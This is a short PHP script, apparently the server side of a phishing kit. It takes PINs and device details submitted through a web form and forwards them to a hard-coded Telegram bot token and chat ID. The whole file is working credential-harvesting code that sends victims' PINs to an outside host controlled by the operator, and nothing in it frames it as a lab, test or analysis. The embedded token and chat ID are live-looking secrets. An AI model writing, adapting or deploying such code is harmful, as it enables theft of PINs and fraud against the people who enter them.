<?php
// Telegram bot token and chat ID
$botToken = '7632408247:AAFYtPXddh_W4WBECoOdT6CdyktPOZf003g';
$chatId = '8198027630';

// Function to send a message to the Telegram bot
function sendMessageToTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    // Use cURL to send the POST request to Telegram API
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true
    );

    $ch = curl_init();
    curl_setopt_array($ch, $options);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// Check if the request method is POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the PIN and device information from the POST data
    $pin = isset($_POST['pin']) ? $_POST['pin'] : '';
    $userAgent = isset($_POST['userAgent']) ? $_POST['userAgent'] : '';
    $platform = isset($_POST['platform']) ? $_POST['platform'] : '';
    $screenWidth = isset($_POST['screenWidth']) ? $_POST['screenWidth'] : '';
    $screenHeight = isset($_POST['screenHeight']) ? $_POST['screenHeight'] : '';

    // Sanitize the input data to prevent any malicious input
    $pin = htmlspecialchars($pin, ENT_QUOTES, 'UTF-8');
    $userAgent = htmlspecialchars($userAgent, ENT_QUOTES, 'UTF-8');
    $platform = htmlspecialchars($platform, ENT_QUOTES, 'UTF-8');
    $screenWidth = htmlspecialchars($screenWidth, ENT_QUOTES, 'UTF-8');
    $screenHeight = htmlspecialchars($screenHeight, ENT_QUOTES, 'UTF-8');

    // Prepare the message to send to Telegram
    $message = "New PIN Entry:\n";
    $message .= "PIN: " . $pin . "\n";
    $message .= "User Agent: " . $userAgent . "\n";
    $message .= "Platform: " . $platform . "\n";
    $message .= "Screen Width: " . $screenWidth . "\n";
    $message .= "Screen Height: " . $screenHeight . "\n";

    // Send the message to Telegram
    $response = sendMessageToTelegram($message);

    // Check the response from Telegram (for debugging purposes)
    if ($response) {
        echo "Data sent to Telegram successfully.";
    } else {
        echo "Failed to send data to Telegram.";
    }
} else {
    // If the request is not POST, display an error or redirect to another page.
    echo "Invalid request method.";
}
?>
